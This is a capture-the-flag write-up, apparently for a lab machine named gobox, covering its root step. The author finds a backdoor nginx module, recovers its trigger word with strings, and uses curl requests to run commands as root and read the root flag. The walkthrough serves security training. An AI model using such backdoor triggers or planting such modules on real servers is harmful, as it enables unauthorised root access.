# # `Enumeration` -

```bash
www-data@gobox:~/html$ cd /etc/nginx/sites-enabled/
www-data@gobox:/etc/nginx/sites-enabled$ ls
default
www-data@gobox:/etc/nginx/sites-enabled$ cat default
<Snip>
server {                                                                                                                                
        listen 4566 default_server;                                                                                                     
                                                                                                                                        
                                                                                                                                        
        root /var/www/html;                                                                                                             
                                                                                                                                        
        index index.html index.htm index.nginx-debian.html;                                                                             
                                                                                                                                        
        server_name _;                                                                                                                  


        location / {
                if ($http_authorization !~ "(.*)SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhh
Y2tpbmdFc3BvcnRz(.*)") {
                    return 403;
                }
                proxy_pass http://127.0.0.1:9000;
        }

}
server {
        listen 80;
        root /opt/website;
        index index.php;

        location ~ [^/]\.php(/|$) {
            fastcgi_index index.php;
            fastcgi_param REQUEST_METHOD $request_method;
            fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
            fastcgi_param QUERY_STRING $query_string;


            fastcgi_pass unix:/tmp/php-fpm.sock;
        }
}
server {
        listen 8080;
        add_header X-Forwarded-Server golang;
        location / {
                proxy_pass http://127.0.0.1:9001;
        }
}

server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}
```

The following from above looks odd -

```bash
server {
        listen 127.0.0.1:8000;
        location / {
                command on;
        }
}
```

Looking into the modules -

```bash
www-data@gobox:/etc/nginx$ cd modules-enabled/
www-data@gobox:/etc/nginx/modules-enabled$ ls
50-backdoor.conf               50-mod-http-xslt-filter.conf  50-mod-stream.conf
50-mod-http-image-filter.conf  50-mod-mail.conf
```

`50-backdoor.conf` is pretty suspicious!

```bash
www-data@gobox:/etc/nginx/modules-enabled$ cat 50-backdoor.conf 
load_module modules/ngx_http_execute_module.so;
```

Googling for “ngx_http_execute_module.so”, the first result is [this GitHub](https://github.com/limithit/NginxExecute):

# # `Exploit` -

According to the docs, I should be able to trigger this backdoor by making a request to the server with this enabled with the parameter `?system.run[command]`.

Since the server is only listening on localhost, I’ll just use `curl` from my shell. It doesn’t work:

```bash
www-data@gobox:/etc/nginx/modules-enabled$ curl http://127.0.0.1:8000?system.run[id]
curl: (52) Empty reply from server
```

Just running strings on the binary is enough to figure out the new command word:

```bash
www-data@gobox:/usr/share/nginx/modules$ strings ngx_http_execute_module.so | grep run
ippsec.run
```

# # `Root`-

```bash
www-data@gobox:/usr/share/nginx/modules$ curl http://127.0.0.1:8000?ippsec.run[id]
uid=0(root) gid=0(root) groups=0(root)
www-data@gobox:/usr/share/nginx/modules$ curl -g "http://127.0.0.1:8000/?ippsec.run[ls /root]"
iptables.sh
root.txt
snap
www-data@gobox:/usr/share/nginx/modules$ curl -g "http://127.0.0.1:8000/?ippsec.run[cat /root/root.txt]"
81d35170fb50fe21ed42cbda4a45913e
```